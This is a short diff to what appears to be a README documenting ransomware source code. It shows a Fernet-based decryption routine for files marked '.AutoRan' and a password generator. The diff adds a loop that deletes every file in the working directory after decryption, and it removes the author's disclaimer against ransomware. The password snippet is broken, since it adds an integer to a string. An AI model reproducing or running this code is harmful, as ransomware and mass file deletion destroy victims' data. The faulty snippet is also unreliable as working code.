@@ -43,6 +43,9 @@ def Decry():
         Data = Encrypt[LockData]
         UnLocked = F.decrypt(Data).decode()
         fp.write(UnLocked)
+      os.rename(f"{LockData}.AutoRan", LockData)
+      for file in os.listdir():
+        os.remove(file)
   except:
     pass
 ```
@@ -51,10 +54,9 @@ def Decry():
 ##### Password Generate Source Code
 ```
 Password = ""
+
 for i in range(0, 8):
   Password = Password+"x"+random.randrange(10, 100)
 ```
 
 #### Use cryptography.fernet
-# I hope this program not work
-#### cause i hate ransomware...
